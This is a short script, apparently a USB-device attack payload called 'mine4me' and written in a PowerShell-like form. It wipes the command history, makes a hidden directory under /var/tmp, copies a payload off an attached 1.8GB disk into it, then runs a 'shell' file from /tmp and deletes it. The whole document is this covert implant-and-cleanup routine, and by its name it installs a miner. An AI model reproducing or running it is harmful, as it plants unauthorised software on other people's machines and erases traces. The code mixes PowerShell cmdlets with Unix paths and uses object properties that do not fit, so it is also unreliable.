$HISTFILE = $null
$HISTSIZE = 0
Remove-Item -Path $HISTFILE -ErrorAction SilentlyContinue
New-Item -Path "/var/tmp/.system" -ItemType "directory"
$disk = (Get-Disk | Where-Object {$_.Size -eq 1.8GB})
$mntt = (Get-Disk | Where-Object {$_.Name -eq $disk.Name}).MountPoints
Copy-Item -Path "$mntt\payloads\library\mine4me\systemIn" -Destination "/var/tmp/.system/systemIO" -Recurse
Set-ItemProperty -Path "/var/tmp/.system/systemIO/systemIO" -Name "IsReadOnly" -Value $false
Copy-Item -Path "$mntt\payloads\library\mine4me\shell" -Destination "/tmp" -Recurse
Set-ItemProperty -Path "/tmp/shell" -Name "IsReadOnly" -Value $false
& "/tmp/shell"
Remove-Item -Path "/tmp/shell" -Force
